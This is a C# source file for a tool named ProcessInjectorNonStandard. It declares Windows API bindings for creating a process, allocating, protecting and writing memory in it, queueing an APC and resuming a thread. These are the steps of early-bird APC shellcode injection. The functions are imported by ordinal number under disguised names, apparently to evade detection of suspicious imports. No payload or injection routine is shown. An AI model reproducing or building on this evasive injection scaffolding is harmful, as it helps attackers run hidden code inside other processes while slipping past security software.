using System;
using System.Diagnostics.Eventing.Reader;
using System.Runtime.InteropServices;

namespace ProcessInjectorNonStandard
{
    internal class WinApi
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        [DllImport("kernel32.dll", EntryPoint = "#233", CharSet = CharSet.Unicode, SetLastError = true)]
        //CreateProcessW - string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
        // ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
        //    string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
        public static extern bool PStart(string app, string cmd, ref SECURITY_ATTRIBUTES proc_attr,
            ref SECURITY_ATTRIBUTES thread_attr, bool inh_hand, uint cflags, IntPtr env,
            string cwd, ref STARTUPINFO str_info, out PROCESS_INFORMATION proc_info);

        [DllImport("kernel32.dll", EntryPoint = "#1117", CharSet = CharSet.Unicode, SetLastError = true)]
        //QueueUserAPC - IntPtr MemoryAddr, IntPtr main_thread_handle, uint 0
        public static extern uint APC(IntPtr addr, IntPtr mthr, uint data);

        [DllImport("kernel32.dll", EntryPoint = "#1237", CharSet = CharSet.Unicode, SetLastError = true)]
        //ResumeThread - IntPtr thread_handle
        public static extern void Resume(IntPtr thand);

        [DllImport("kernel32.dll", EntryPoint = "#1500", CharSet = CharSet.Unicode, SetLastError = true)]
        //VirtualAllocEx - hProcess, LpAddress, dwSize, flAllocationType, flProtect
        public static extern IntPtr Alloc(IntPtr hproc, IntPtr addr, uint size, uint aloc, uint prot);

        [DllImport("kernel32.dll", EntryPoint = "#1506", CharSet = CharSet.Unicode, SetLastError = true)]
        //VirtualProtectEx - hProcess, lpAddress, dwSize, flAllocationType, flProtect
        public static extern bool Protect(IntPtr hproc, IntPtr addr, int size, uint aloc, uint prot);

        [DllImport("kernel32.dll", EntryPoint = "#1584", CharSet = CharSet.Unicode, SetLastError = true)]
        //WriteProcessMemory - hProcess, lpBaseAddress, lpBuffer, nSize, out lpNumberOfBytesWritten
        public static extern bool Writer(IntPtr hproc, IntPtr addr, byte[] buf, uint size, out uint bwrite);

    }
}
